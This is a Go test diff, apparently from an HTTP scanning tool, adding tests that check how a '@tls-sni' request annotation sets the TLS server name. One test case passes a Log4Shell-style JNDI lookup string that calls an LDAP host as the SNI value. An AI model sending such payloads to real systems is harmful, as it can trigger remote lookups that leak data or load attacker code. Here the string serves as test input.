@@ -10,6 +10,37 @@ import (
 	"github.com/stretchr/testify/require"
 )
 
+func TestRequestParseAnnotationsSNI(t *testing.T) {
+	t.Run("compliant-SNI-value", func(t *testing.T) {
+		req := &Request{connConfiguration: &httpclientpool.Configuration{}}
+		rawRequest := `@tls-sni: github.com
+		GET / HTTP/1.1
+		Host: {{Hostname}}`
+
+		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
+		require.Nil(t, err, "could not create http request")
+
+		overrides, modified := req.parseAnnotations(rawRequest, httpReq)
+		require.True(t, modified, "could not apply request annotations")
+		require.Equal(t, "github.com", overrides.request.TLS.ServerName)
+		require.Equal(t, "example.com", overrides.request.URL.Hostname())
+	})
+	t.Run("non-compliant-SNI-value", func(t *testing.T) {
+		req := &Request{connConfiguration: &httpclientpool.Configuration{}}
+		rawRequest := `@tls-sni: ${jndi:ldap://${hostName}.test.com}
+		GET / HTTP/1.1
+		Host: {{Hostname}}`
+
+		httpReq, err := retryablehttp.NewRequest(http.MethodGet, "https://example.com", nil)
+		require.Nil(t, err, "could not create http request")
+
+		overrides, modified := req.parseAnnotations(rawRequest, httpReq)
+		require.True(t, modified, "could not apply request annotations")
+		require.Equal(t, "${jndi:ldap://${hostName}.test.com}", overrides.request.TLS.ServerName)
+		require.Equal(t, "example.com", overrides.request.URL.Hostname())
+	})
+}
+
 func TestRequestParseAnnotationsTimeout(t *testing.T) {
 	t.Run("positive", func(t *testing.T) {
 		request := &Request{
